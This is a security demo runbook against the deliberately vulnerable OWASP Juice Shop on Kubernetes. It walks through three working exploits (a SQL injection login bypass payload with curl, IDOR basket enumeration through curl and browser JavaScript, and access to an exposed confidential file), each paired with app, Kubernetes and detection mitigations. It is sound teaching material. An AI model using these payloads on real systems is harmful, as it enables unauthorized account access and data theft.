# Exploit & Mitigation Runbook

Follow this live during the demo. Each vuln maps to an OWASP Top 10 (2021) category
and is structured the way the assessment asks: **what it is → why it exists → how
it's exploited → what the attacker gains → how to mitigate (app / k8s / detection).**

Set a shell variable to your load balancer URL first:

```bash
export JUICE=http://$(kubectl -n juice-shop get svc juice-shop \
  -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')
echo "$JUICE"
```

> Tip: do every exploit through the browser (visual, convincing) **and** show the raw
> `curl` so the audience sees the actual request. Keep DevTools open on the Network tab.

> **Validated locally against `bkimminich/juice-shop:v17.1.1`** (Docker). All three
> exploits below confirmed working: SQLi logs in as `admin@juice-sh.op`; the admin
> token reads baskets 2 and 3 (other users); `/ftp/acquisitions.md` returns the
> confidential file.
>
> **Quoting gotcha:** the SQLi payload must send the email as a single `'`. The bash
> `curl` examples here are correct. If you run it from **PowerShell** instead, build
> the JSON from an object so the quote isn't doubled —
> `@{email="' OR 1=1--";password="x"} | ConvertTo-Json` — a naive here-string sends
> `'' OR 1=1--` and you get a 401.

---

## Vuln 1 — A03:2021 Injection (SQL injection → auth bypass)

**What it is.** The login form builds a SQL query by concatenating user input instead
of using parameterized queries, so input is interpreted as SQL.

**Why it exists.** Juice Shop's login does roughly
`SELECT * FROM Users WHERE email = '<input>' AND password = '<hash>'`. The email field
is not sanitized or bound as a parameter.

**How to exploit.** In the Login form, enter email `' OR 1=1--` and any password. The
`--` comments out the password check and `OR 1=1` makes the WHERE always true; you log
in as the first user in the table (the admin).

Raw request:

```bash
curl -s "$JUICE/rest/user/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | jq .
```

You get back an authentication token for the admin account.

**What the attacker gains.** Full admin session without credentials. From there:
read all orders, access the admin panel, and pivot to other data. A tweaked payload
(`UNION SELECT`) can dump arbitrary tables — full DB read.

**Mitigation**
- **App:** parameterized queries / prepared statements (bind variables); use the ORM's
  safe query builder; input validation; least-privilege DB account.
- **Kubernetes / infra:** a WAF in front (ALB + AWS WAF or managed rules) blocks common
  SQLi signatures as defense-in-depth; NetworkPolicy limits what a compromised pod can
  reach so a DB dump can't be shipped out.
- **Detection:** spike in 500s/auth successes from one IP; WAF SQLi rule hits; DB audit
  log showing `OR 1=1` / `UNION`. In runtime terms: unexpected outbound connection from
  the app pod right after login = exfil signal.

---

## Vuln 2 — A01:2021 Broken Access Control (IDOR → basket access)

**What it is.** The API authorizes by *authentication* but not by *ownership*: a
logged-in user can read another user's basket by changing an ID in the URL.

**Why it exists.** The endpoint `GET /rest/basket/:id` checks that you have a valid
token but never checks that `:id` belongs to *you*. Classic insecure direct object
reference.

**How to exploit.** Register/log in as a normal user, note your basket id (e.g. `6`),
then request neighboring ids:

```bash
# $TOKEN = your own token from logging in normally
curl -s "$JUICE/rest/basket/1" -H "Authorization: Bearer $TOKEN" | jq .
curl -s "$JUICE/rest/basket/2" -H "Authorization: Bearer $TOKEN" | jq .
```

You receive baskets that aren't yours.

**Browser demo (two beats).** Do this logged in as a normal throwaway user
(`demo@demo.com` / anything — email isn't verified) so the point is *horizontal*
access. Validated live: baskets `1`–`6` are populated (basket `1` = UserId 1 / admin,
3 products — the fullest; `7`+ are empty).

*Beat 1 — the API leaks raw data.* In DevTools → Console on the juice-shop tab:

```js
// juice-shop stores the JWT quote-wrapped, so JSON.parse strips the quotes
let t = localStorage.getItem('token'); try { t = JSON.parse(t); } catch (e) {}
fetch('/rest/basket/1', { headers: { Authorization: 'Bearer ' + t } })
  .then(r => r.json()).then(console.log);
```

Expand the result: products plus a `UserId` that isn't yours. Change `1` → `2` and
re-run to show enumeration across users. (The `JSON.parse` is juice-shop plumbing, not
the vuln — the point is the server never checks that the basket belongs to you. The
raw `curl` above sidesteps the quote issue if you'd rather not explain it on stage.)

*Beat 2 — the app renders someone else's cart.* The console fetch only prints JSON; it
does not repaint the page. To make the UI itself show another user's basket, force the
app's own basket id and let it re-fetch:

```js
sessionStorage.getItem('bid');      // confirm YOUR basket id
sessionStorage.setItem('bid', '1'); // point the app at basket 1 (admin's)
```

Then click **Your Basket** (or reload the basket route) — the app calls
`GET /rest/basket/1` itself and renders admin's items as if they were yours.

> **Storage gotcha:** some versions keep `bid` in `localStorage`, not `sessionStorage`.
> If `sessionStorage.getItem('bid')` is `null`, set it on `localStorage` instead.

**What the attacker gains.** Horizontal privilege escalation — read other customers'
cart/order data. Enumerating ids = bulk data harvesting across the user base.

**Mitigation**
- **App:** enforce object-level authorization on every request
  (`basket.ownerId == currentUser.id`); use non-guessable identifiers (UUIDs) as
  defense-in-depth, but ownership checks are the real fix.
- **Kubernetes / infra:** can't fix authz logic at the k8s layer — this is the honest
  "the platform won't save you" point. What infra *does*: rate-limiting / WAF to slow
  enumeration, and audit logging of access patterns.
- **Detection:** one token requesting many sequential object ids in a short window;
  anomalous read volume per session.

---

## Vuln 3 — A05:2021 Security Misconfiguration (sensitive files / admin exposure)

**What it is.** Default/leftover configuration exposes things that shouldn't be
reachable — an accessible admin area, confidential files served from a public path,
and verbose error output.

**Why it exists.** Shipping with debug features on, directory listing / static files
exposed, and no segmentation between "public app" and "admin/ops surface."

**How to exploit.** Hit the confidential document and the admin section directly:

```bash
curl -s "$JUICE/ftp/acquisitions.md"            # confidential doc served publicly
curl -s -o /dev/null -w "%{http_code}\n" "$JUICE/#/administration"
```

Show the admin panel loading in the browser, and the leaked file contents.

**What the attacker gains.** Information disclosure (internal docs, config), and
reaching privileged functionality that was assumed to be hidden. Misconfig is often
the first foothold that chains into the others.

**Mitigation**
- **App:** disable debug/verbose errors in prod; remove sample/confidential files;
  gate admin routes behind real authz + network restriction.
- **Kubernetes / infra:** `NODE_ENV=production` via ConfigMap (not `unsafe`); Pod
  Security Admission `restricted`; drop capabilities, non-root, read-only root FS so a
  foothold can't be weaponized; NetworkPolicy to isolate the pod; secrets in AWS
  Secrets Manager / External Secrets, never in images or env.
- **Detection:** requests to known-sensitive paths (`/ftp/`, `/administration`);
  runtime detection flagging a shell spawned in the container or writes to unexpected paths.

> **Optional 4th / substitute — A07 Identification & Auth Failures (JWT).** Juice Shop
> signs JWTs weakly; you can forge/alter a token (e.g. `alg` confusion) to impersonate
> users. Keep as backup if one of the above misbehaves on the day.

---

## Why this trio

They're independent (one failing won't block the others), visually obvious, and they
span three different OWASP categories — injection, access control, and
misconfiguration — which shows breadth rather than three flavors of the same bug. The
misconfig one is also the natural bridge to the Kubernetes hardening story.

---

## Showing the mitigations live (moderate depth)

After the three exploits, apply the hardened overlay and re-run a probe to show a
control working:

```powershell
# Flip the namespace to the 'restricted' Pod Security Standard
kubectl label ns juice-shop pod-security.kubernetes.io/enforce=restricted --overwrite

# Apply hardened deployment + default-deny NetworkPolicy
kubectl apply -f k8s/hardened/juice-shop-hardened.yaml

# Wait for the new (hardened) pod to actually come up before probing
kubectl -n juice-shop rollout status deploy/juice-shop --timeout=120s

# Prove egress is now blocked. Re-run this SAME probe before and after hardening:
#   before → "ALLOWED - reached internet (HTTP 200)"
#   after  → "BLOCKED - timed out, no egress"
kubectl -n juice-shop exec deploy/juice-shop -- /nodejs/bin/node -e "const https=require('https');const r=https.get('https://example.com',res=>{console.log('ALLOWED - reached internet (HTTP '+res.statusCode+')');process.exit(0)});r.on('error',e=>{console.log('BLOCKED - '+e.code);process.exit(0)});r.setTimeout(5000,()=>{console.log('BLOCKED - timed out, no egress');r.destroy();process.exit(0)});"
```

> **Image gotcha (validated on v17.1.1):** the Juice Shop image is **distroless** — no
> shell, no `curl`/`wget`, and `node` is **not on `$PATH`**. So `exec ... -- sh -c
> 'curl ...'` fails with an OCI "executable not found" error, not a clean BLOCKED. Call
> the Node binary by absolute path (`/nodejs/bin/node`, v20.17.0) and do the HTTPS probe
> in JavaScript, as above. DNS (port 53) is allowed by the policy, so the hostname
> resolves but the :443 connection is dropped → the 5s timeout prints BLOCKED.
>
> **Run it from PowerShell, not Git Bash.** Git Bash (MSYS) rewrites the leading-slash
> `/nodejs/bin/node` into a Windows path and the exec fails; if you must use Bash, prefix
> the command with `MSYS_NO_PATHCONV=1`.

Talking point: the app-level SQLi still exists (hardening doesn't patch code), **but**
the attacker can no longer exfiltrate, escalate on the node, or move laterally — the
runtime controls shrank the blast radius. That's the Upwind thesis: assume the app has
bugs, constrain and detect at runtime.

> **NetworkPolicy enforcement — verify BEFORE the demo.** The default EKS VPC CNI only
> *enforces* NetworkPolicy when it's explicitly enabled; otherwise the policy is accepted
> but silently **not enforced**, and the egress probe above still prints ALLOWED after
> hardening — the opposite of the point. On this cluster it was found **disabled**
> (`--enable-network-policy=false`, no Calico). Enable it and re-test:
>
> ```powershell
> aws eks update-addon --cluster-name <cluster> --addon-name vpc-cni \
>   --configuration-values '{"enableNetworkPolicy":"true"}'
> ```
>
> (or install Calico). The node agent restarts with enforcement on (~1–2 min); then
> confirm the probe flips from ALLOWED to BLOCKED before you present.
